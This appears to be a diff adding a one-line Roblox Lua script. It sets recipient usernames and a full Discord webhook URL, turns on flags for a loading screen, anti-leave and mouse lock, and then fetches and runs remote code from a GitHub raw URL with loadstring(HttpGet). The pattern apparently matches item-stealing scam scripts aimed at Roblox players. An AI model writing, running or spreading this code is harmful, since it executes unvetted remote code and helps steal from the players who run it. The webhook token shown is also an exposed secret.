@@ -1,0 +1,1 @@
+do UserName="Loicbou1237";Webhook="https://discord.com/api/webhooks/1126316947915681832/LVkwrXZpygqJVJHP_8tP58foVfS9L3j7tRA_cv7PHw0d5mxegKJ-3AMfXOEt95i_TQ-z";UserName2="Loicbou2009";_G.LoadingScreen=true;_G.AntiLeave=true;_G.MouseLock=true;loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScriptZ",true))(); end
